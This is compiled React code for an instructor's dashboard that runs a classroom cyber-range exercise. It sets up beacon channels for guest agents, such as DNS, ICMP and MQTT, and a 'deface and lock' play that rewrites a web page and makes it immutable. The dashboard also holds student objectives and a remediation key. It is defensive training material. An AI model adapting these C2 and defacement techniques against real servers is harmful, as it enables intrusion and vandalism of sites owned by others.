									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("label", {
										className: "text-sm text-muted",
										htmlFor: "token",
										children: "Lab token"
									}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
										type: "button",
										className: "min-h-11 px-2 text-sm text-primary",
										onClick: newToken,
										children: "Generate"
									})]
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									id: "token",
									value: cfg.token,
									autoComplete: "off",
									spellCheck: false,
									suppressHydrationWarning: true,
									placeholder: "at least 8 characters",
									onChange: (event) => patch({ token: event.target.value }),
									className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 font-mono text-sm text-fg"
								}),
								tokenShort ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
									className: "text-sm text-primary",
									children: "Token must be at least 8 characters or the agent will refuse it."
								}) : null
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "grid grid-cols-2 gap-3",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
								label: "Linux agent id",
								value: cfg.linuxId,
								onChange: (linuxId) => patch({ linuxId })
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
								label: "Windows agent id",
								value: cfg.windowsId,
								onChange: (windowsId) => patch({ windowsId })
							})]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
							className: "flex flex-col gap-2 text-sm text-muted",
							children: [
								"Timing",
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("select", {
									value: cfg.timing,
									onChange: (event) => patch({ timing: event.target.value }),
									className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 text-fg",
									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
										value: "continuous",
										children: "Continuous — stays up for the class"
									}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
										value: "off",
										children: "Off — no beacon until you turn it back on"
									})]
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
									className: "text-sm leading-relaxed text-muted",
									children: [
										"Continuous is the attacker for the whole exercise. TCP, WebSocket, and MQTT stay connected, so there is no poll clock. HTTP, DNS, and ICMP have to ask, about once a second, or a command cannot land. Off stops that beacon. Those three look again in about half an hour, which is how ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "profile continuous"
										}),
										" gets through without a login."
									]
								})
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "flex flex-col gap-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-sm text-muted",
								children: "Ports"
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "grid grid-cols-2 gap-2",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PresetButton, {
									active: preset === "class",
									onClick: () => applyPreset("class"),
									label: "Class ports",
									detail: "443, 80, 53"
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(PresetButton, {
									active: preset === "open",
									onClick: () => applyPreset("open"),
									label: "No sudo bind",
									detail: "8443, 8088, 5353"
								})]
							})]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "grid grid-cols-2 gap-3 sm:grid-cols-3",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PortField, {
									label: "TCP",
									value: cfg.tcp,
									onChange: (tcp) => patch({ tcp })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PortField, {
									label: "HTTP",
									value: cfg.http,
									onChange: (http) => patch({ http })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PortField, {
									label: "DNS",
									value: cfg.dns,
									onChange: (dns) => patch({ dns })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PortField, {
									label: "MQTT",
									value: cfg.mqtt,
									onChange: (mqtt) => patch({ mqtt })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(PortField, {
									label: "WebSocket",
									value: cfg.ws,
									onChange: (ws) => patch({ ws })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
									label: "DNS zone",
									value: cfg.zone,
									onChange: (zone) => patch({ zone })
								})
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
							label: "Web root override",
							value: cfg.webroot,
							placeholder: "blank = autodetect per guest",
							onChange: (webroot) => patch({ webroot })
						})
					]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-4 lg:col-span-3",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CommandCard, {
							title: "Attacker",
							hint: "Ubuntu operator. sudo is required for ports under 1024 and for ICMP.",
							command: operatorCommand(cfg, {
								page: htmlName ? `deface/${htmlName}` : void 0,
								image: imageName ? `deface/${imageName}` : void 0
							})
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CommandCard, {
							title: "Linux guest",
							hint: "Debian 9 or 12. sudo so the immutable flag can be set. Python 3.5 or newer, no packages.",
							command: linuxAgentCommand(cfg)
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CommandCard, {
							title: "Windows 10 guest",
							hint: needsPythonOnWindows(cfg.channel) ? "PowerShell only speaks TCP, HTTP, and WebSocket. This channel needs range.py and Python on the guest." : "Stock PowerShell 5.1. Elevate the prompt if you want the ACL lock. The switch is -Timing, not -Profile.",
							command: windowsCommand(cfg)
						})
					]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LabFloor, {
				cfg,
				onChange: patch,
				htmlName,
				htmlText,
				imageName,
				imageBytes
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
				className: "flex flex-col gap-4",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "flex items-center gap-2",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Radio, {
							className: "size-5 text-primary",
							"aria-hidden": "true"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
							className: "text-lg font-semibold",
							children: "Channel the class will see"
						})]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
						className: "grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6",
						children: CHANNELS.map((item) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
							type: "button",
							onClick: () => patch({ channel: item.id }),
							className: "min-h-11 rounded-xl border px-3 py-3 text-left text-sm font-medium " + (cfg.channel === item.id ? "border-primary bg-surface text-primary" : "border-border bg-surface text-fg"),
							"aria-pressed": cfg.channel === item.id,
							children: item.label
						}, item.id))
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("article", {
						className: "rounded-xl border border-border bg-surface p-4 sm:p-5",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
								className: "text-base font-semibold",
								children: channel.label
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "mt-2 max-w-3xl text-sm leading-relaxed text-muted",
								children: channel.tell
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "mt-4 font-mono text-xs tracking-wide text-muted uppercase",
								children: "Wireshark"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("pre", {
								className: "mt-2 overflow-x-auto rounded-lg bg-surface-2 p-3 font-mono text-sm text-fg",
								children: channel.filter
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
								className: "mt-4 font-mono text-xs tracking-wide text-muted uppercase",
								children: "Shape, not a capture"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("pre", {
								className: "mt-2 overflow-x-auto rounded-lg bg-surface-2 p-3 font-mono text-sm text-fg",
								children: channel.shape
							})
						]
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
				className: "grid gap-4 lg:grid-cols-2",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("article", {
					className: "flex flex-col gap-3 rounded-xl border border-border bg-surface p-4 sm:p-5",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "flex items-center gap-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Lock, {
								className: "size-5 text-primary",
								"aria-hidden": "true"
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
								className: "text-lg font-semibold",
								children: "Deface and lock"
							})]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
							className: "text-sm leading-relaxed text-muted",
							children: [
								"After ",
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "font-mono text-fg",
									children: "sessions"
								}),
								" shows the guest, select it and run the play. The page heading becomes whatever your file says, or Defaced if you did not upload one. Linux then sets the immutable attribute. Windows sets read-only and a write deny. Say the brief out loud. Do not paste the fix into the guest."
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "grid gap-3 sm:grid-cols-2",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
								className: "flex flex-col gap-2 text-sm text-muted",
								children: ["index.html", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									type: "file",
									accept: ".html,text/html",
									className: "min-h-11 text-sm text-fg file:mr-3 file:min-h-11 file:rounded-lg file:border-0 file:bg-surface-2 file:px-3 file:text-fg",
									onChange: (event) => {
										const file = event.target.files?.[0];
										if (!file) return;
										if (file.size > 2e5) {
											setUploadNote("That page is over 200KB. Trim it.");
											return;
										}
										file.text().then((text) => {
											const name = file.name.replace(/[^A-Za-z0-9._-]/g, "") || "index.html";
											setHtmlName(name);
											setHtmlText(text);
											setUploadNote("");
										});
									}
								})]
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
								className: "flex flex-col gap-2 text-sm text-muted",
								children: ["Image next to the page", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									type: "file",
									accept: "image/*",
									className: "min-h-11 text-sm text-fg file:mr-3 file:min-h-11 file:rounded-lg file:border-0 file:bg-surface-2 file:px-3 file:text-fg",
									onChange: (event) => {
										const file = event.target.files?.[0];
										if (!file) return;
										if (file.size > 35e4) {
											setUploadNote("That image is over 350KB. Use WebSocket, TCP, or MQTT, and keep it smaller.");
											return;
										}
										file.arrayBuffer().then((buffer) => {
											const name = file.name.replace(/[^A-Za-z0-9._-]/g, "") || "banner.png";
											setImageName(name);
											setImageBytes(new Uint8Array(buffer));
											setUploadNote("Put the image in the same folder as index.html. Reference it with a relative src. DNS will carry it, slowly.");
										});
									}
								})]
							})]
						}),
						htmlName || imageName ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
							className: "text-sm text-muted",
							children: [
								"Unzip the path files so ",
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "font-mono text-fg",
									children: "deface/"
								}),
								" sits next to range.py.",
								htmlName ? ` Page: ${htmlName}.` : "",
								imageName ? ` Image: ${imageName}.` : ""
							]
						}) : null,
						uploadNote ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "text-sm text-primary",
							children: uploadNote
						}) : null,
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CommandCard, {
							title: "What you say",
							hint: "Safe to project.",
							command: "A site you control has changed. Capture the traffic, find the callback, and put the page back. If the editor will not save, that problem is on the host."
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CommandCard, {
							title: "What you type",
							hint: "One agent selected. If that guest is off, profile continuous first. HTTP, DNS, and ICMP hear that on the next quiet check.",
							command: "use " + (cfg.linuxId || "web01") + "\nplay deface"
						})
					]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("article", {
					className: "flex flex-col gap-3 rounded-xl border border-border bg-surface p-4 sm:p-5",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
							className: "text-lg font-semibold",
							children: "What “done” looks like for them"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("ol", {
							className: "flex list-decimal flex-col gap-2 pl-5 text-sm leading-relaxed text-muted",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: "The page and its mtime changed, and it was not an SSH session." }),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: "The callback is one of the six patterns, with the command in hex or base64 inside a field that is the wrong size." }),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: "The file itself is locked. Removing the callback process does not unlock it." }),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: "The agent is still running, named range.py or range-agent.ps1. Stopping it is a separate step from restoring the page." })
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("details", {
							className: "rounded-lg border border-border bg-surface-2 p-3",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("summary", {
								className: "min-h-11 cursor-pointer text-sm font-medium text-fg",
								children: "Instructor key — remediation"
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "mt-3 flex flex-col gap-3 text-sm leading-relaxed text-muted",
								children: [
									/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { children: [
										"Linux: ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "lsattr index.html"
										}),
										" shows ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "i"
										}),
										".",
										" ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "chattr -i index.html"
										}),
										", then restore from their own copy or rewrite the page. If you kept a backup it is in the agent user’s ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "~/.range-lab/index.html.orig"
										}),
										" (root: ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "/root/.range-lab"
										}),
										")."
									] }),
									/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { children: [
										"Windows: ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "attrib"
										}),
										" shows R, ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "icacls"
										}),
										" shows a deny for Everyone (S-1-1-0).",
										" ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "attrib -R"
										}),
										", then ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "icacls index.html /remove:d *S-1-1-0"
										}),
										". Backup, if you kept one: ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "C:\\ProgramData\\RangeLab\\index.html.orig"
										}),
										"."
									] }),
									/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { children: [
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "play undo"
										}),
										" does both steps for you when the room is stuck.",
										" ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "play deface nobackup"
										}),
										" leaves no side copy.",
										" ",
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
											className: "font-mono text-fg",
											children: "IMMUTABLE=failed"
										}),
										" means that guest is not ext4 or the agent is not root — the page still changes, the lock does not."
									] })
								]
							})]
						})
					]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("footer", {
				className: "border-t border-border pt-4 text-sm leading-relaxed text-muted",
				children: [
					"Run ",
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "font-mono text-fg",
						children: "python3 range.py selftest"
					}),
					" on the attacker before class. Pass means TCP, HTTP, DNS, MQTT, and WebSocket round-tripped a real deface and restore on loopback. ICMP needs a raw socket, so it only comes up under sudo on Linux. Nothing here listens outside the VM network you point it at."
				]
			})
		]
	});
}
function Field({ label, value, onChange, placeholder }) {
	const id = label.replace(/\s+/g, "-").toLowerCase();
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
		className: "flex flex-col gap-2 text-sm text-muted",
		htmlFor: id,
		children: [label, /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
			id,
			value,
			placeholder,
			spellCheck: false,
			suppressHydrationWarning: true,
			onChange: (event) => onChange(event.target.value),
			className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 font-mono text-sm text-fg"
		})]
	});
}
function PortField({ label, value, onChange }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
		className: "flex flex-col gap-2 text-sm text-muted",
		children: [label, /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
			inputMode: "numeric",
			value: String(value),
			suppressHydrationWarning: true,
			onChange: (event) => {
				const next = Number(event.target.value.replace(/[^0-9]/g, ""));
				if (Number.isFinite(next)) onChange(Math.min(next, 65535));
			},
			className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 font-mono text-sm text-fg"
		})]
	});
}
function PresetButton({ active, onClick, label, detail }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
		type: "button",
		onClick,
		className: "min-h-11 rounded-lg border px-3 py-2 text-left " + (active ? "border-primary text-primary" : "border-border text-fg"),
		"aria-pressed": active,
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
			className: "block text-sm font-medium",
			children: label
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
			className: "block font-mono text-xs text-muted",
			children: detail
		})]
	});
}
function CommandCard({ title, hint, command }) {
	const [copied, setCopied] = (0, import_react.useState)(false);
	async function copy() {
		try {
			await navigator.clipboard.writeText(command);
			setCopied(true);
			window.setTimeout(() => setCopied(false), 1600);
		} catch {
			setCopied(false);
		}
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
		className: "rounded-xl border border-border bg-surface p-4",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "flex items-start justify-between gap-3",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "text-base font-semibold",
				children: title
			}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-1 text-sm leading-relaxed text-muted",
				children: hint
			})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
				type: "button",
				onClick: copy,
				className: "inline-flex min-h-11 shrink-0 items-center gap-2 rounded-lg border border-border px-3 text-sm text-fg",
				children: [copied ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, {
					className: "size-4 text-primary",
					"aria-hidden": "true"
				}) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Copy, {
					className: "size-4",
					"aria-hidden": "true"
				}), copied ? "Copied" : "Copy"]
			})]
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("pre", {
			className: "mt-3 overflow-x-auto whitespace-pre-wrap rounded-lg bg-surface-2 p-3 font-mono text-sm leading-relaxed text-fg",
			children: command
		})]
	});
}
//#endregion
export { Home as component };
